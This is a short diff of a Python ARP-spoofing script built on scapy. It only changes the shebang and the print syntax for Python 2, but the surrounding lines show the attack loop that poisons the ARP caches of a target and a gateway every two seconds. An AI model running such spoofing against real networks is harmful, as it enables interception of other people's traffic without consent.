@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
 
 import scapy.all as scapy
 import subprocess
@@ -53,7 +53,7 @@ try:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         sent_packets_count += 2
-        print("\r[+] Sending ARP Spoof to " + target_ip + " and " + gateway_ip + " [Sent: " + str(sent_packets_count) + "]", end="")
+        print("\r[+] Sending ARP Spoof to " + target_ip + " and " + gateway_ip + " [Sent: " + str(sent_packets_count) + "]"),
         time.sleep(2)
 except KeyboardInterrupt:
     # stop ip forwarding for packets
